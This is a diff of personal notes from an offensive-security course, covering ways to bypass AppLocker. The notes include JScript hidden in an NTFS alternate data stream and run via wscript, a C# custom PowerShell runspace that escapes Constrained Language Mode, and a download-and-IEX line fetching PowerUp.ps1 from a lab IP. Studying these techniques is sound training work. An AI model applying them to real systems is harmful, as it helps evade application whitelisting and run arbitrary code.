@@ -331,18 +331,27 @@ of the log file with the : notation:
 
 to create alternate stream :
 
+run in an command prompt
 ```
->type test.js > "C:\Program Files 
-(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
+type test.js > "C:\Users\misthios\codeplay\pen300\book\chapter8\new.log:test.js"
 ```
 
-we vrify whther the data was wrtten or not
+followed by wscript command
+
+```
+wscript "C:\Users\misthios\codeplay\pen300\book\chapter8\new.log:test.js"
+```
+
+we verify whether the data was wrtten or not
 
 data is not written.
 
 ### 8.2.3.1 Exercises
 1. Repeat the exercise to embed simple Jscript code inside an alternative data stream to 
 obtain execution.
+
+done 
+
 2. Replace the current Jscript code with a DotNetToJscript shellcode runner and obtain a 
 Meterpreter reverse shell
 
@@ -381,24 +390,24 @@ the various restrictions Applocker places on PowerShell and demonstrate various 
 
 # Powershell constrained language mode
 
+constrained language mode odesnot seem to work in normal powershell
+only in enterprise.a
+
 weak protection mechanism can be easily bypassed with the built in "Bypass" execution policy. 
 
 To address this, Microsoft introduced the ConstrainedLanguage mode (CLM) with PowerShell 
 version 3.0. When AppLocker (or WDAC) is enforcing whitelisting rules against PowerShell scripts, 
 ConstrainedLanguage is enabled as well
 
-Under ConstrainedLanguage, scripts that are located in whitelisted locations or otherwise comply 
-with a whitelisting rule can execute with full functionality. However, if a script does not comply 
-with the rules, or if commands are entered directly on the command line, ConstrainedLanguage
-imposes numerous restrictions.
-
 ```
 PS C:\Users\m\Documents\sysinternals> [Math]::Cos(1)
 0.54030230586814
 ```
 
-PS C:\Users\m\Documents\sysinternals> $ExecutionContext.SessionState.LanguageMode
+```
+PS C:\Windows\System32> $ExecutionContext.SessionState.LanguageMode
 FullLanguage
+```
 
 cant check because it comes out to be FUll Language.
 
@@ -408,5 +417,53 @@ context of the “student” user.
 
 2. Check if our existing PowerShell shellcode runner is stopped once constrained language 
 mode is enabled.
+
+# custom runspaces
+
+PowerShell.exe is essentially a GUI application handling input and output. The real functionality 
+lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to 
+create a runspace.
+
+```c#
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
+```
+
+we can also use powerup instead o fth eabove script using the run spaces
+
+```C#
+String cmd = "(New-Object 
+System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX; 
+Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
+
+```
+
+### 8.3.2.1 Exercises
+1. Recreate the application shown in this section to set up a custom runspace and execute 
+arbitrary PowerShell code without limitations.
+2. Modify the C# code to implement our PowerShell shellcode runner.
+3. Create an AppLocker deny rule for 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe and verify that this does 
+not hinder our custom runspace
+
+# 8.3.3 Powershell CLM bypass
 
 
